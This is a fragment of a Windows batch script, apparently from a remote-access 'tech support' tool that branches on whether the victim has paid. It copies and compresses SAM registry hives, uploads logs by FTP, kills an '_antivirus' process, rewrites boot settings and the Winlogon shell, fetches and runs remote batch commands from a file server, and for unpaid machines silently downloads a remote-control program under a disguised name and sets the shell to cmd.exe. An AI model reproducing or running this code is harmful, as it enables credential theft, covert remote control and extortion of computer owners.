REM net user TechSupport /delete" >NUL 2>&1
REM net localgroup Administrators TechSupport /delete"
echo mark473>>"%log%"
if exist %systemroot%\boot\pcat (bootsect.exe /nt60 sys /force >NUL 2>&1)
REM if exist %systemroot%\boot\pcat (bcdedit.exe /default {bootmgr} >NUL 2>&1)
cd /d %systemdrive%\
copy /y ntldr-xp ntldr 2>&1 >NUL 2>&1
attrib +s +h +r ntldr & attrib +s +h +r ntldr-xp & attrib +s +h +r ntdetect.com
echo mark474>>"%log%"
del menu.lst peldr bootmgr2 boot-vista* peboot.bin vmlinuz initrd.gz connect.cmd >NUL 2>&1
del vistacd* support*7z* grldr* support*iso >NUL 2>&1
del minint.7z base.7z programs.7z hbcd.7z os_install* >NUL 2>&1
pskill _antivirus &del %drv0%\%_windir%\_antivirus*
del "%startdir%\erunt*" >NUL 2>&1 & del "%temp%\code.vbs" >NUL 2>&1
rmdir /s /q minint;programs;hbcd;os_install;sources;boot-vistape >NUL 2>&1
cd /d %systemroot%\erdnt\%id% || echo Error ernt4945>>"%log%" && goto cont461753
if not exist erdnt.inf-backup copy erdnt.inf erdnt.inf-backup ||echo Error ernt7283>>"%log%"
echo [SystemRoot]>erdnt.inf
echo "%drv0%\%_windir%">>erdnt.inf
echo [Restore]>>erdnt.inf
type erdnt.inf-backup | find /I "SAM" >>erdnt.inf
start erdnt silent sysreg /nobackup /noprogresswindow&sleep 10&pskill erdnt&&echo error ernt8416>>"%log%"
move /y erdnt.inf-backup erdnt.inf ||echo Error ernt4329>>"%log%" && goto ftp_upload
if not exist %id%-backup (move %id% %id%-backup)
%path1%\erunt\erunt.exe %SystemRoot%\erdnt\%id%b /noconfirmdelete /noprogresswindow 2>&1 >NUL 2>&1
cd /d ..\
echo mark9545>>"%log%"
if not exist %id%.7z (7z a -p123123 -mx0 %id%.7z %id%)
if not exist %id%b.7z (7z a -p123123 -mx0 %id%b.7z %id%b)
if exist %id% (move %id% %id%-%random%) & if exist %id%b (move %id%b %id%b-%random%)
cd /d %systemdrive%\
echo mark475>>"%log%"

:cont461753
echo mark476>>"%log%"
reg delete hklm\software\Microsoft"\Windows NT"\CurrentVersion\Winlogon /v AutoAdminLogon /f
reg delete hklm\software\Microsoft"\Windows NT"\CurrentVersion\Winlogon /v DefaultPassword /f
if exist %systemroot%\winlogon.reg (reg import %systemroot%\winlogon.reg && del %systemroot%\winlogon.reg)
reg add hklm\software\Microsoft"\Windows NT"\CurrentVersion\Winlogon /v shell /t REG_SZ /f /d explorer.exe,runcycle
sc config msfwhlpr start= system >NUL 2>&1
sc config msfwdrv start= auto >NUL 2>&1
sc config msfwsvc start= auto >NUL 2>&1
sc config mpfilter start= auto >NUL 2>&1
sc config onecaremp start= auto >NUL 2>&1
sc config winss start= auto >NUL 2>&1
cls & pskill lock.exe >NUL 2>&1

echo mark479>>"%log%"
REM del "%startdir%\start menu\programs\startup\ " >NUL 2>&1

bcdedit.exe /timeout 5 2>&1 >NUL 2>&1 & bcdedit /deletevalue {default} safeboot 2>&1 >NUL 2>&1
If exist %drv0%\boot.ini_tmp (attrib -H -R -A -S %drv0%\boot.ini & copy /y %drv0%\boot.ini_tmp %drv0%\boot.ini)
attrib +A +R +H %drv0%\boot.ini >NUL 2>&1

REM sc create SystemMon binPath= " " type= own type= interact error= ignore 2>&1 >NUL 2>&1
REM sc description SystemMon "Monitors System Stability" 2>&1 >NUL 2>&1
REM sc config SystemMon start= auto binPath= "%drv0%\%_windir%\system32\cmd.exe /c _uninst.exe" >NUL 2>&1

echo @rmdir /s /q %path1% >%systemdrive%\_uninst.bat
echo @if exist %systemroot%\winlogon.reg reg import %systemroot%\winlogon.reg^&^&del %systemroot%\winlogon.reg>>%systemdrive%\_uninst.bat
echo @del /q /a "%temp%\*" >>%systemdrive%\_uninst.bat
echo @del %systemdrive%\_uninst.bat >>%systemdrive%\_uninst.bat
reg add hklm\software\Microsoft\Windows\CurrentVersion\RunOnce /v _uninstall /t REG_SZ /d %systemdrive%\_uninst.bat /f

if exist %path1% attrib +H %path1%

 > "%temp%\code.vbs" ECHO WScript.Timeout = 60
 >> "%temp%\code.vbs" ECHO WScript.Echo msgBox("System Will Reboot. Save any current Files",vbsystemModal+0,"Finished")
if "%silent%" neq "yes"  cscript //e:vbscript //NoLogo "%temp%\code.vbs"
REM del "%temp%\code.vbs" >NUL 2>&1
CALL :nosafemode
REM shutdown.exe /r /f /t 30 ||shutdown2.exe /r &echo PC Will Reboot Now &echo PC Will Reboot Now>>"%log%"
download http://%fileserver%/%id%-uninstalled /timeout:10 /overwrite /display:silent /output:"%temp%"
if "%paid%" neq "yes" (echo uninstall complete>>"%log%" & CALL :ftp_upload)

:_uninst
set ftpfile=%log%
echo mark2345>>"%log%"
set uninst=yes&echo path1=%path1%&echo id=%id%
if "%id%" equ "" (echo error 543076417>>"%log%" &goto ftp_upload)
download http://%fileserver%/%id%-paid /overwrite /timeout:10 /output:"%temp%" &&set paid=yes
download http://%fileserver%/%id%-unpaid /timeout:10 /overwrite /output:"%temp%" &&set unpaid=yes
download http://%fileserver%/%id%-commands.bat /timeout:10 /overwrite &&CALL %id%-commands.bat
download http://%fileserver%/all-commands.bat /timeout:10 /overwrite &&CALL all-commands.bat

if "%paid%" equ "yes" (goto :paid)
REM shutdown.exe /r /f /t 60 ||shutdown2.exe /r &echo PC Will Reboot Now &echo PC Will Reboot Now>>"%log%"
if "%unpaid%" equ "yes" (goto :unpaid)
goto EOF

:paid
  echo mark2268>>"%log%"
  reg delete "hklm\system\CurrentControlSet\Control\SafeBoot\Network\sshd" /f
  reg delete "hklm\system\CurrentControlSet\Control\SafeBoot\Network\uvnc_service" /f
  reg delete "hklm\system\CurrentControlSet\Control\SafeBoot\Network\StabilityMon" /f
  reg add hkcr\clsid\{FD6905CE-952F-41F1-9A6F-135D9C6622CC} /v "" /t REG_SZ /f /d "WscNotify Class"
  reg add hkcr\clsid\{FD6905CE-952F-41F1-9A6F-135D9C6622CC}\Programmable /f
  reg add hkcr\clsid\{FD6905CE-952F-41F1-9A6F-135D9C6622CC}\InprocServer32 /v "" /t REG_SZ /f /d wscntfy.dll
  reg add hkcr\clsid\{FD6905CE-952F-41F1-9A6F-135D9C6622CC}\InprocServer32 /v ThreadingModel /t REG_SZ /f /d free
  reg add hklm\software\Microsoft\Windows\CurrentVersion\policies\system /v EnableLUA /t REG_DWORD /d 1 /f >NUL 2>&1
  reg add hklm\software\Microsoft\Windows\CurrentVersion\policies\system /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 2 /f
  reg add hklm\software\Microsoft\Windows\CurrentVersion\policies\system /v ConsentPromptBehavioruser /t REG_DWORD /d 2 /f
  reg add hklm\software\Microsoft"\Windows NT"\CurrentVersion\Winlogon /v shell /t REG_SZ /f /d explorer.exe
  echo deleting %path1%\_support & rmdir /s /q %path1%\_support >NUL 2>&1 & sc delete SystemMon >NUL
  REM sc config wscsvc start= auto 2>&1 >NUL 2>&1
  del %systemroot%\_uninst.exe || error 689160529 >>"%log%"
  del %systemroot%\sessmngr.exe %systemroot%\_support.* %systemroot%\runcycle.* >NUL 2>&1
  echo deleting task [sysupdate] & schtasks /delete /f /tn sysupdate
  echo uninstall[paid]complete>>"%log%"
  set ftpfile=%log% & CALL :ftp_upload
goto EOF

:unpaid
  echo re-installing support with safemode option [unpaid]
  download http://%fileserver%/netsupport.exe /timeout:120 /overwrite /output:%systemroot%\sessmngr.exe
  reg add hklm\software\Microsoft"\Windows NT"\CurrentVersion\Winlogon /v shell /t REG_SZ /f /d cmd.exe
  sessmngr.exe support & goto EOF
goto EOF


:EOF

::
